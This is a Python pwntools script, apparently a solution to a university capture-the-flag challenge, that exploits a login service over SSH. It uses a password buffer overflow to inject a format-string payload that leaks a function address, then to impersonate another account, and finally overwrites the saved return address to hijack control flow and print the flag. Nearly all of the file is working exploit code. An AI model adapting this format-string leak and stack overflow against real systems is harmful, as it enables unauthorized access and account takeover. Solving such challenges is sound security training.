#!/usr/bin/env python3
import re
from pwn import *

# It's possible for this to occasionally fail, so run it a few times until it works.
for i in range(20):
    # Connect via SSH and initiate interactive "shell"
    p = ssh("customer", "poison-in-the-wells-4.ctf.umanitobacssa.ca", password="ctf2025!", port=30204, timeout=5, raw=True)
    io = p.shell()

    format_string = b"%7$p\n"

    # Login with the known username and password. Use the password buffer overflow to overwrite our username
    # with a format string that will leak the address of the transactions() function
    io.sendline(b"login dgumshoe")
    io.sendline(b"w1z@rdk1dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhcain0000P%7$pP")

    # Once we call transactions our username gets echoed to us, but with the format string applied
    # We can use a regex to extract the address of the transactions() function
    io.sendline(b"transactions")

    io.recvuntil(b"Please re-enter your password for account");
    text = io.recvuntil(b"An error occurred while attempting to authenticate your account.")
    match = re.search(rb"P(0x[0-9a-f]+)P", text)

    transactions_addr = match.group(1).decode()
    print(f"transactions addr: {transactions_addr}")

    # Now we can log out and log back in, use the buffer overflow to authenticate with dgumshoe's password
    # but instead get authenticated as hcain
    io.sendline(b"logout")
    io.sendline(b"login dgumshoe")
    io.sendline(b"w1z@rdk1dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhcain0000000000")

    io.recvuntil(b'welcome hcain0000000000!')
    io.recvuntil(b'Enter a command: ')

    # Now we can use the buffer overflow to overwrite the return address to the main function 
    # with the address of the transactions() function
    payload = b"A" * 64  # Fill buffer
    payload += b"B" * 8   # Overwrite saved RBP
    payload += p64(int(transactions_addr, 16) + 0x8)  # Overwrite return address with transactions() address

    io.sendline(payload);

    # The flag will now be printed
    text = io.recvuntil(b"System error detected", timeout=3)
    match = re.search(rb"(cssactf{.*})", text)

    if match:
        flag = match.group(1).decode()
        print(f"GOT FLAG: {flag}")
        io.close()
        exit(0)
    else:
        print("Flag not found.")
        io.close()

print("Flag not found.")
exit(1)


